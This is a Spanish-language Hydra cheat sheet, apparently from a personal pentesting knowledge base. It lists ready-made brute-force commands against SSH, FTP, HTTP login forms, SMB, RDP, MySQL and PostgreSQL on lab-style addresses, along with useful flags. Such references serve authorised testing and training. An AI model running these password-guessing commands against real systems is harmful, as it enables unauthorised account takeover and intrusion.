# Hydra — Cheat Sheet

> Fuerza bruta contra servicios (SSH, FTP, HTTP, SMB, etc.).

---

## Sintaxis básica

```bash
hydra -l <user> -P <wordlist> <target> <service>
hydra -L <users.txt> -P <wordlist> <target> <service>
```

## Servicios comunes

```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.x

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.x

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# HTTP GET
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-get "/admin"

# SMB
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://10.10.10.x

# RDP
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.x

# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.x

# PostgreSQL
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://10.10.10.x
```

## Opciones útiles

```bash
-t <n>                           # Threads (default: 16)
-f                               # Parar en el primer éxito
-F                               # Parar cuando todos los hilos terminen
-v                               # Verbose
-V                               # Ver cada intento
-d                               # Debug
-o <file>                        # Output a archivo
-s <port>                        # Puerto personalizado
-S                               # Usar SSL
```

## HTTP POST form (detalles)

```bash
# Formato: "path:post_data:failure_string"
hydra -l admin -P wordlist.txt 10.10.10.x http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"

# Con cookies
hydra -l admin -P wordlist.txt 10.10.10.x http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie\: session=abc123"
```

## Fuerza bruta de usuarios

```bash
hydra -L users.txt -P password.txt 10.10.10.x ssh
hydra -L users.txt -p admin 10.10.10.x ssh
```

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Explotación de Servicios - Linux]] — Uso de Hydra en pentesting
- [[Explotación de Servicios - Windows]] — Fuerza bruta en Windows

> #hydra #herramientas #fuerzabruta #pentest
